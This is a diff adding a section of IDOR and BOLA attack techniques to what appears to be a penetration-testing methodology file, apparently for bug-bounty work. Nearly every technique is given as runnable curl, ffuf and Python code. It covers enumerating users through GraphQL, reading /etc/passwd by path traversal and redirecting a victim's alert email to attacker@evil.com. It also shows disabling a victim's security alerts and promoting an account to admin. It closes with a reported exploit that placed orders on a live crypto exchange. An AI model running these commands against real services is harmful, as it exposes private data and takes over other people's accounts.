@@ -544,3 +544,284 @@ user can read every other user's invoices.
 - https://portswigger.net/web-security/access-control
 - https://hackerone.com/reports (filter for IDOR / BOLA)
 - https://book.hacktricks.xyz/pentesting-web/idor
+
+---
+
+## 2026 IDOR Techniques
+
+### 1. UUID/GUID Predictability Testing
+UUIDv1 is time-based and includes the MAC address — it's predictable. UUIDv4 should be random but some implementations use weak PRNGs.
+```bash
+# Detect UUID version from a sample
+python3 - <<'PY'
+import uuid
+sample = "YOUR-UUID-HERE"
+u = uuid.UUID(sample)
+print(f"Version: {u.version}")
+print(f"Variant: {u.variant}")
+if u.version == 1:
+    import datetime
+    ts = datetime.datetime.fromtimestamp((u.time - 0x01b21dd213814000) * 100 / 1e9)
+    print(f"Timestamp: {ts}")
+    print(f"Node (MAC): {':'.join(f'{b:02x}' for b in u.node.to_bytes(6,'big'))}")
+    print("WARNING: UUIDv1 is predictable — generate adjacent UUIDs by incrementing timestamp")
+PY
+
+# Generate adjacent UUIDv1s for enumeration (sandwich attack)
+python3 - <<'PY'
+import uuid, struct
+known = uuid.UUID("KNOWN-UUIDv1")
+for delta in range(-100, 100):
+    new_time = known.time + delta
+    fields = list(known.fields)
+    fields[0] = new_time & 0xFFFFFFFF           # time_low
+    fields[1] = (new_time >> 32) & 0xFFFF       # time_mid
+    fields[2] = (new_time >> 48) & 0x0FFF | 0x1000  # time_hi_version
+    candidate = uuid.UUID(fields=tuple(fields))
+    print(candidate)
+PY
+```
+
+### 2. IDOR via GraphQL Node Queries
+GraphQL's global `node(id: "...")` interface resolves ANY object by its global ID, often a base64-encoded `Type:numeric_id`.
+```bash
+# Decode a GraphQL global ID
+echo "VXNlcjoxMjM=" | base64 -d
+# Output: User:123
+
+# Enumerate users via node queries
+for n in $(seq 1 200); do
+  gid=$(printf "User:%d" $n | base64 | tr -d '=')
+  curl -sk -H "Authorization: Bearer $BOB_TOKEN" \
+    -H "Content-Type: application/json" \
+    "https://target/graphql" \
+    -d "{\"query\":\"{ node(id:\\\"$gid\\\") { ... on User { id email name role } } }\"}" \
+    | jq -c '.data.node // empty' | grep -v null && echo "  ^^^ ID=$n"
+done
+
+# Try different object types
+for type in User Order Invoice Document Payment Account; do
+  gid=$(printf "$type:1" | base64 | tr -d '=')
+  curl -sk -H "Authorization: Bearer $BOB_TOKEN" \
+    -H "Content-Type: application/json" \
+    "https://target/graphql" \
+    -d "{\"query\":\"{ node(id:\\\"$gid\\\") { __typename } }\"}" \
+    | jq -c '.data.node // empty'
+done
+```
+
+### 3. IDOR in File Upload/Download Endpoints
+File endpoints often use predictable paths or IDs, and combine path traversal with IDOR.
+```bash
+# Test download endpoints with sequential IDs
+for id in $(seq 1 50); do
+  code=$(curl -sk -o /dev/null -w "%{http_code}" \
+    -H "Authorization: Bearer $BOB_TOKEN" \
+    "https://target/api/files/$id/download")
+  [ "$code" = "200" ] && echo "IDOR: Bob can download file $id"
+done
+
+# Test path traversal in file names
+curl -sk -H "Authorization: Bearer $BOB_TOKEN" \
+  "https://target/api/files/download?name=../../../etc/passwd"
+curl -sk -H "Authorization: Bearer $BOB_TOKEN" \
+  "https://target/api/files/download?path=../../other-user/documents/secret.pdf"
+
+# Check if upload UUIDs are predictable (UUIDv1 in URLs)
+curl -sk -H "Authorization: Bearer $ALICE_TOKEN" https://target/api/files \
+  | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' \
+  | head -5
+```
+
+### 4. IDOR via API Version Differences
+Older API versions often lack authorization checks that were added later. Always test both.
+```bash
+# If v2 is protected, try v1
+curl -sk -H "Authorization: Bearer $BOB_TOKEN" "https://target/api/v2/users/$ALICE_ID"
+# 403 Forbidden
+
+curl -sk -H "Authorization: Bearer $BOB_TOKEN" "https://target/api/v1/users/$ALICE_ID"
+# 200 OK — IDOR!
+
+# Enumerate API versions
+for v in v1 v2 v3 v0 api-v1 api-v2; do
+  code=$(curl -sk -o /dev/null -w "%{http_code}" \
+    -H "Authorization: Bearer $BOB_TOKEN" \
+    "https://target/$v/users/$ALICE_ID")
+  echo "$v → $code"
+done
+
+# Also check: /api/internal/, /api/legacy/, /api/beta/, /api/staging/
+```
+
+### 5. IDOR in WebSocket Channels/Rooms
+WebSocket connections often use room IDs or channel names without proper authorization.
+```bash
+# Connect to WebSocket and subscribe to another user's channel
+pip3 install websocket-client
+python3 - <<'PY'
+import websocket, json
+
+ws = websocket.create_connection("wss://target/ws",
+    header=["Authorization: Bearer BOB_TOKEN"])
+
+# Subscribe to Alice's notification channel
+ws.send(json.dumps({"action":"subscribe","channel":"user-ALICE_ID-notifications"}))
+# Or try room IDs
+ws.send(json.dumps({"action":"join","room":"1234"}))
+
+while True:
+    msg = ws.recv()
+    print(f"Received: {msg}")
+    if "ALICE" in msg or "alice" in msg:
+        print("IDOR CONFIRMED: Receiving Alice's messages!")
+        break
+PY
+```
+
+### 6. IDOR via Export/Report Generation
+Export endpoints generate files containing user data — often without ownership checks.
+```bash
+# Trigger Alice's export as Bob
+curl -sk -H "Authorization: Bearer $BOB_TOKEN" \
+  "https://target/api/export/user/$ALICE_ID" -o alice_export.csv
+
+# Try export IDs (sequential)
+for id in $(seq 1 50); do
+  curl -sk -H "Authorization: Bearer $BOB_TOKEN" \
+    "https://target/api/exports/$id/download" -o "export_$id.csv" -w "%{http_code}\n"
+done
+
+# Check report generation endpoints
+curl -sk -H "Authorization: Bearer $BOB_TOKEN" \
+  -X POST "https://target/api/reports/generate" \
+  -H "Content-Type: application/json" \
+  -d "{\"user_id\":\"$ALICE_ID\",\"type\":\"financial\"}"
+```
+
+### 7. IDOR in Notification/Email Preferences
+Notification settings endpoints often lack proper object-level authorization.
+```bash
+# Read Alice's notification preferences as Bob
+curl -sk -H "Authorization: Bearer $BOB_TOKEN" \
+  "https://target/api/users/$ALICE_ID/notifications" | jq .
+
+# Modify Alice's email preferences (change notification email to attacker's)
+curl -sk -X PUT -H "Authorization: Bearer $BOB_TOKEN" \
+  -H "Content-Type: application/json" \
+  "https://target/api/users/$ALICE_ID/notifications" \
+  -d '{"email":"attacker@evil.com","sms_enabled":false}'
+
+# Unsubscribe another user from security alerts
+curl -sk -X PATCH -H "Authorization: Bearer $BOB_TOKEN" \
+  -H "Content-Type: application/json" \
+  "https://target/api/users/$ALICE_ID/preferences" \
+  -d '{"security_alerts":false,"login_notifications":false}'
+```
+
+### 8. BOLA vs BFLA — Test Both
+BOLA (Broken Object Level Authorization) = accessing another user's objects. BFLA (Broken Function Level Authorization) = accessing functions you shouldn't have.
+```bash
+# BOLA test: Bob accessing Alice's object
+curl -sk -H "Authorization: Bearer $BOB_TOKEN" "https://target/api/users/$ALICE_ID/profile"
+
+# BFLA test: Regular user accessing admin functions
+curl -sk -H "Authorization: Bearer $BOB_TOKEN" "https://target/api/admin/users"
+curl -sk -H "Authorization: Bearer $BOB_TOKEN" -X DELETE "https://target/api/admin/users/$ALICE_ID"
+curl -sk -H "Authorization: Bearer $BOB_TOKEN" -X POST "https://target/api/admin/config" \
+  -d '{"maintenance_mode":true}'
+
+# BFLA via method override
+curl -sk -X POST -H "X-HTTP-Method-Override: DELETE" \
+  -H "Authorization: Bearer $BOB_TOKEN" "https://target/api/admin/users/$ALICE_ID"
+
+# Combine both: BOLA + BFLA
+curl -sk -H "Authorization: Bearer $BOB_TOKEN" \
+  -X PUT "https://target/api/users/$ALICE_ID" \
+  -H "Content-Type: application/json" \
+  -d '{"role":"admin","is_admin":true}'
+```
+
+### 9. Numeric ID Enumeration vs Hash-Based ID Brute Force
+```bash
+# Numeric: straightforward sequential sweep
+ffuf -u "https://target/api/users/FUZZ" \
+  -H "Authorization: Bearer $BOB_TOKEN" \
+  -w <(seq 1 10000) -mc 200 -t 10 -p 0.1
+
+# Hash-based: precompute hashes if IDs are md5/sha1 of sequential integers
+python3 - <<'PY'
+import hashlib
+for i in range(1, 10000):
+    md5 = hashlib.md5(str(i).encode()).hexdigest()
+    sha1 = hashlib.sha1(str(i).encode()).hexdigest()
+    crc = format(hashlib.new('crc32', str(i).encode()).digest()[0], 'x') if False else ''
+    print(f"{i},{md5},{sha1}")
+PY > /tmp/hash-ids.txt
+
+# Test with md5 IDs
+awk -F, '{print $2}' /tmp/hash-ids.txt | head -1000 > /tmp/md5-ids.txt
+ffuf -u "https://target/api/users/FUZZ" \
+  -H "Authorization: Bearer $BOB_TOKEN" \
+  -w /tmp/md5-ids.txt -mc 200 -t 10
+```
+
+### 10. IDOR in Multi-Tenant SaaS (Tenant Isolation Bypass)
+```bash
+# Test cross-tenant access by swapping org/tenant IDs
+curl -sk -H "Authorization: Bearer $BOB_TOKEN" \
+  "https://target/api/orgs/$ALICE_ORG_ID/users"
+curl -sk -H "Authorization: Bearer $BOB_TOKEN" \
+  "https://target/api/tenants/$OTHER_TENANT/data"
+
+# Check if tenant ID is in a header, cookie, or subdomain
+curl -sk -H "Authorization: Bearer $BOB_TOKEN" \
+  -H "X-Tenant-ID: other-tenant" \
+  "https://target/api/users"
+
+# Subdomain-based tenancy — try cross-tenant API calls
+curl -sk -H "Authorization: Bearer $BOB_TOKEN" \
+  "https://alice-company.target.com/api/users"
+```
+
+### 11. IDOR Response Comparison Automation
+Hash responses and diff them to detect when Bob sees Alice's unique data.
+```bash
+# Automated response hashing
+cat > /tmp/idor-diff.py <<'PY'
+import subprocess, hashlib, json, sys
+
+ENDPOINT_TEMPLATE = sys.argv[1]  # e.g., https://target/api/users/{id}/profile
+ALICE_TOKEN = sys.argv[2]
+BOB_TOKEN = sys.argv[3]
+IDS = range(1, 100)
+
+for uid in IDS:
+    url = ENDPOINT_TEMPLATE.replace("{id}", str(uid))
+
+    a = subprocess.run(["curl","-sk","-H",f"Authorization: Bearer {ALICE_TOKEN}", url],
+                       capture_output=True)
+    b = subprocess.run(["curl","-sk","-H",f"Authorization: Bearer {BOB_TOKEN}", url],
+                       capture_output=True)
+
+    a_hash = hashlib.sha256(a.stdout).hexdigest()[:12]
+    b_hash = hashlib.sha256(b.stdout).hexdigest()[:12]
+
+    if b.returncode == 0 and len(b.stdout) > 10 and b"error" not in b.stdout.lower():
+        status = "IDOR" if a_hash == b_hash else "DIFF"
+        print(f"ID={uid:5d} alice={a_hash} bob={b_hash} [{status}]")
+PY
+
+python3 /tmp/idor-diff.py "https://target/api/users/{id}/profile" "$ALICE_TOKEN" "$BOB_TOKEN"
+```
+
+### 12. Proven: Bumba Exchange IDOR
+On Night 5 (2026-04-15), the Bumba Exchange `accounts` query returned data for other `user_id`s despite `canTrade:false` restrictions. The GraphQL accounts endpoint allowed horizontal privilege escalation — querying another user's account data by swapping the `user_id` parameter. This led to the first CRITICAL finding: placing market orders on a live cryptocurrency exchange despite being restricted.
+```bash
+# Pattern that worked on Bumba:
+# 1. Self-register → get JWT
+# 2. Query own accounts → note the user_id field
+# 3. Swap user_id in the accounts query → see other users' data
+# 4. Chain with order placement → CRITICAL impact
+# Key lesson: even "restricted" accounts can still ACCESS data via IDOR
+```
